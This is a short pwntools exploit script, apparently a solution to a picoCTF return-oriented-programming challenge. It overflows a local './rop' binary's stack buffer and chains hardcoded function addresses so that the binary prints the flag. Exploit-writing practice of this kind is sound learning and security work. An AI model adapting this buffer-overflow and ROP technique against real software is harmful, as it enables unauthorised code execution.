#coding=utf-8
from pwn import *

leapA = 0x565556dd
leap2 = 0x565556f4
leap3 = 0x5655575d
leap3_win3 = 0x56555787
display_flag = 0x565557aa

# pop ebp ; ret
pop_ebp = 0x565556f2
# push esp ; add byte ptr [eax], al ; add byte ptr [ecx], al ; mov ebx, dword ptr [ebp - 4] ; leave ; ret
change_esp_ebp = 0x565556bd

buf = 0xffffd4b0
ret = 0xffffd4cc 

flag = ''
payload = 'a' * (ret - buf) 
payload += p32(leapA)
payload += p32(leap3)
#payload += p32(pop_ebp)
payload += p32(leap3_win3)
payload += p32(leap2) 
payload += p32(display_flag) 
payload += p32(0xdeadbeef) 

log.info(payload.encode('hex'))
'''
while  flag:
    p = process('./rop')
    p.sendline(payload)
    res = p.recvall(1)
    if 'picoCTF' in res:
        flag = res
        print flag
'''
